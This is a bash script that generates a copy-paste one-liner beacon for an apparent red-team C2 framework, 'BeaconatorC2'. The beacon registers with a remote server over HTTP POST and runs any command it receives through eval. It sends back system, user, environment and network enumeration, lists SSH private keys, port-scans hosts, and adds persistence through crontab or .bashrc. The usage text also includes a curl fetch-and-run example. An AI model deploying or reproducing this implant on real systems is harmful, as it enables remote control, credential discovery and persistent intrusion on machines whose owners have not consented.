#!/bin/bash
#
# Bash One-Liner Beacon for BeaconatorC2
# A minimal shell-based beacon that can be executed as a single command
# Supports HTTP communication with the BeaconatorC2 framework
#

# Configuration (modify these variables)
DEFAULT_SERVER="127.0.0.1"
DEFAULT_PORT="8080"
DEFAULT_ENDPOINT="/"
DEFAULT_INTERVAL="15"

# Function to generate the one-liner beacon
generate_oneliner() {
    local server="${1:-$DEFAULT_SERVER}"
    local port="${2:-$DEFAULT_PORT}"
    local endpoint="${3:-$DEFAULT_ENDPOINT}"
    local interval="${4:-$DEFAULT_INTERVAL}"
    
    cat << 'ONELINER'
(S="${SERVER:-127.0.0.1}";P="${PORT:-8080}";E="${ENDPOINT:-/}";I="${INTERVAL:-15}";ID=$(echo -n "$(hostname)$(whoami)$(date +%s)$$" | md5sum 2>/dev/null | cut -d' ' -f1 | head -c8 2>/dev/null || echo "$(hostname)$(whoami)" | head -c8);URL="http://$S:$P$E";curl -s -X POST "$URL" -H "User-Agent: BashBeacon/$ID" -d "register|$ID|$(hostname)" >/dev/null 2>&1;while true;do CMD=$(curl -s -X POST "$URL" -H "User-Agent: BashBeacon/$ID" -d "request_action|$ID" 2>/dev/null);if [ "$CMD" != "no_pending_commands" ] && [ -n "$CMD" ] && [ "$CMD" != "ERROR"* ];then if [[ "$CMD" == "shutdown" ]];then OUT="=== CLEANUP ==="$'\n'"Stopping beacon and cleaning up..."$'\n';curl -s -X POST "$URL" -H "User-Agent: BashBeacon/$ID" -d "command_output|$ID|$OUT" >/dev/null 2>&1;break;elif [[ "$CMD" == execute_command\|* ]];then OUT=$(eval "${CMD#execute_command|}" 2>&1);elif [[ "$CMD" == execute_module\|* ]];then MOD=$(echo "$CMD" | cut -d'|' -f2);PARAMS=$(echo "$CMD" | cut -d'|' -f3-);case "$MOD" in SystemInfo)OUT="=== SYSTEM INFO ===
Hostname: $(hostname)
User: $(whoami)
UID: $(id -u)
Groups: $(id -G 2>/dev/null | tr ' ' ',')
OS: $(uname -a)
Uptime: $(uptime)
Shell: $SHELL
PWD: $(pwd)
PID: $$
PPID: $PPID";; ProcessEnum)OUT="=== PROCESS ENUMERATION ==="$'\n'"$(ps aux 2>/dev/null || ps -ef)";; NetworkEnum)OUT="=== NETWORK ENUMERATION ==="$'\n'"Interfaces:"$'\n'"$(ip addr show 2>/dev/null || ifconfig 2>/dev/null || echo 'Network tools not available')"$'\n\n'"Connections:"$'\n'"$(netstat -tuln 2>/dev/null || ss -tuln 2>/dev/null || echo 'No netstat/ss available')";; UserEnum)OUT="=== USER ENUMERATION ==="$'\n'"Current User: $(whoami) (UID: $(id -u))"$'\n'"Groups: $(groups 2>/dev/null || echo 'groups command not available')"$'\n'"Sudo Check: $(timeout 1 sudo -n true 2>/dev/null && echo 'SUDO ACCESS' || echo 'No sudo access')"$'\n'"Home Dir: $HOME"$'\n'"Users with shells:"$'\n'"$(getent passwd 2>/dev/null | grep -E '/bash$|/sh$|/zsh$|/fish$' | cut -d: -f1,3,6 | head -20 || cat /etc/passwd 2>/dev/null | grep -E '/bash$|/sh$|/zsh$|/fish$' | cut -d: -f1,3,6 | head -20 || echo 'Cannot enumerate users')";; ServiceEnum)OUT="=== SERVICE ENUMERATION ==="$'\n'"$(systemctl list-units --type=service --state=running 2>/dev/null | head -30 || service --status-all 2>/dev/null | head -30 || echo 'Cannot enumerate services')";; EnvironmentEnum)OUT="=== ENVIRONMENT ENUMERATION ==="$'\n'"PATH: $PATH"$'\n'"LD_LIBRARY_PATH: $LD_LIBRARY_PATH"$'\n'"HOME: $HOME"$'\n'"SHELL: $SHELL"$'\n'"USER: $USER"$'\n'"Environment Variables:"$'\n'"$(env | head -50 | grep -E '^[A-Z_]+=' | sort)";; FileSearch)DIR=$(echo "$PARAMS" | cut -d',' -f1);PATTERN=$(echo "$PARAMS" | cut -d',' -f2);OUT="=== FILE SEARCH ==="$'\n'"Searching for '$PATTERN' in '$DIR'"$'\n'"$(find "${DIR:-/tmp}" -name "*${PATTERN:-txt}*" -type f 2>/dev/null | head -100 || echo 'Search failed or no results')";; PortScan)TARGET=$(echo "$PARAMS" | cut -d',' -f1);PORTS=$(echo "$PARAMS" | cut -d',' -f2);OUT="=== PORT SCAN ==="$'\n'"Scanning ${TARGET:-127.0.0.1} for ports: ${PORTS:-22,80,443}"$'\n';for port in $(echo "${PORTS:-22,80,443}" | tr ',' ' ');do timeout 3 bash -c "</dev/tcp/${TARGET:-127.0.0.1}/$port" 2>/dev/null && OUT="$OUT$port: OPEN"$'\n' || OUT="$OUT$port: CLOSED"$'\n';done;; DNSEnum)DOMAIN=$(echo "$PARAMS" | cut -d',' -f1);OUT="=== DNS ENUMERATION ==="$'\n'"Domain: ${DOMAIN:-example.com}"$'\n'"$(nslookup "${DOMAIN:-example.com}" 2>/dev/null || dig "${DOMAIN:-example.com}" 2>/dev/null || echo 'DNS tools not available')";; SSH_Discovery)OUT="=== SSH KEY DISCOVERY ==="$'\n';if [ -d "$HOME/.ssh" ];then OUT="$OUT"$'\n'"SSH Directory found: $HOME/.ssh"$'\n'"$(ls -la $HOME/.ssh/ 2>/dev/null)"$'\n\n'"Private Keys:"$'\n'"$(find $HOME/.ssh/ -name 'id_*' -not -name '*.pub' 2>/dev/null | head -10)"$'\n\n'"Public Keys:"$'\n'"$(find $HOME/.ssh/ -name '*.pub' 2>/dev/null | head -10)"$'\n\n'"Known Hosts:"$'\n'"$(wc -l $HOME/.ssh/known_hosts 2>/dev/null || echo 'No known_hosts file')";else OUT="$OUT"$'\n'"No SSH directory found";fi;; Persistence)METHOD=$(echo "$PARAMS" | cut -d',' -f1);CMD=$(echo "$PARAMS" | cut -d',' -f2-);OUT="=== PERSISTENCE ==="$'\n'"Method: ${METHOD:-cron}"$'\n'"Command: ${CMD:-echo 'test'}"$'\n';case "${METHOD:-cron}" in cron)OUT="$OUT$(echo '* * * * * '"${CMD:-echo 'test'}" | crontab - 2>&1 && echo 'Cron job added' || echo 'Cron setup failed')";; bashrc)OUT="$OUT$(echo "${CMD:-echo 'test'}" >> ~/.bashrc 2>&1 && echo 'Added to bashrc' || echo 'bashrc modification failed')";; *)OUT="$OUT"$'\n'"Unsupported persistence method: ${METHOD}";; esac;; Cleanup)OUT="=== CLEANUP ==="$'\n'"Stopping beacon and cleaning up..."$'\n';curl -s -X POST "$URL" -H "User-Agent: BashBeacon/$ID" -d "command_output|$ID|$OUT" >/dev/null 2>&1;break;; *)OUT="ERROR: Unknown module '$MOD'";; esac;else OUT=$(eval "$CMD" 2>&1);fi;curl -s -X POST "$URL" -H "User-Agent: BashBeacon/$ID" -d "command_output|$ID|$OUT" >/dev/null 2>&1;fi;sleep "$I";done) &
ONELINER
}

# Function to generate customized one-liner
generate_custom_oneliner() {
    local server="${1:-$DEFAULT_SERVER}"
    local port="${2:-$DEFAULT_PORT}"
    local endpoint="${3:-$DEFAULT_ENDPOINT}"
    local interval="${4:-$DEFAULT_INTERVAL}"
    
    # Replace placeholders in the one-liner
    generate_oneliner | sed "s/\${SERVER:-127.0.0.1}/\${SERVER:-$server}/g" | \
                       sed "s/\${PORT:-8080}/\${PORT:-$port}/g" | \
                       sed "s/\${ENDPOINT:-\/}/\${ENDPOINT:-$(echo "$endpoint" | sed 's/\//\\\//g')}/g" | \
                       sed "s/\${INTERVAL:-15}/\${INTERVAL:-$interval}/g"
}

# Function to show usage
show_usage() {
    cat << EOF
Bash One-Liner Beacon Generator for BeaconatorC2

Usage: $0 [OPTIONS]

OPTIONS:
    -h, --help              Show this help message
    -s, --server SERVER     Server IP/hostname (default: $DEFAULT_SERVER)
    -p, --port PORT         Server port (default: $DEFAULT_PORT)
    -e, --endpoint PATH     HTTP endpoint (default: $DEFAULT_ENDPOINT)
    -i, --interval SECONDS  Check-in interval (default: $DEFAULT_INTERVAL)
    -g, --generate          Generate default one-liner
    -c, --custom            Generate custom one-liner with provided options

Examples:
    # Generate default one-liner
    $0 --generate

    # Generate custom one-liner for specific server
    $0 --custom --server 192.168.1.100 --port 8080

    # Execute the one-liner directly (for testing)
    SERVER=192.168.1.100 PORT=8080 bash -c "\$(curl -s http://192.168.1.100/beacon.sh)"

Modules Supported:
    - SystemInfo: Comprehensive system information
    - ProcessEnum: Running process enumeration
    - NetworkEnum: Network interface and connection info
    - UserEnum: User and privilege enumeration
    - ServiceEnum: Service enumeration
    - EnvironmentEnum: Environment variable listing
    - FileSearch: Search for files by pattern
    - PortScan: Simple port scanning
    - DNSEnum: DNS enumeration
    - SSH_Discovery: SSH key discovery
    - Persistence: Basic persistence mechanisms
    - Cleanup: Stop beacon and cleanup

The one-liner runs in the background and communicates with BeaconatorC2 via HTTP POST requests.
EOF
}

# Main execution
main() {
    local server="$DEFAULT_SERVER"
    local port="$DEFAULT_PORT"
    local endpoint="$DEFAULT_ENDPOINT"
    local interval="$DEFAULT_INTERVAL"
    local action=""

    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--help)
                show_usage
                exit 0
                ;;
            -s|--server)
                server="$2"
                shift 2
                ;;
            -p|--port)
                port="$2"
                shift 2
                ;;
            -e|--endpoint)
                endpoint="$2"
                shift 2
                ;;
            -i|--interval)
                interval="$2"
                shift 2
                ;;
            -g|--generate)
                action="generate"
                shift
                ;;
            -c|--custom)
                action="custom"
                shift
                ;;
            *)
                echo "Unknown option: $1"
                show_usage
                exit 1
                ;;
        esac
    done

    case "$action" in
        generate)
            echo "# Default Bash One-Liner Beacon"
            echo "# Copy and paste the following line into a Linux terminal:"
            echo ""
            generate_oneliner
            echo ""
            ;;
        custom)
            echo "# Custom Bash One-Liner Beacon"
            echo "# Server: $server:$port$endpoint"
            echo "# Interval: $interval seconds"
            echo "# Copy and paste the following line into a Linux terminal:"
            echo ""
            generate_custom_oneliner "$server" "$port" "$endpoint" "$interval"
            echo ""
            ;;
        *)
            show_usage
            ;;
    esac
}

# Run main function if script is executed directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi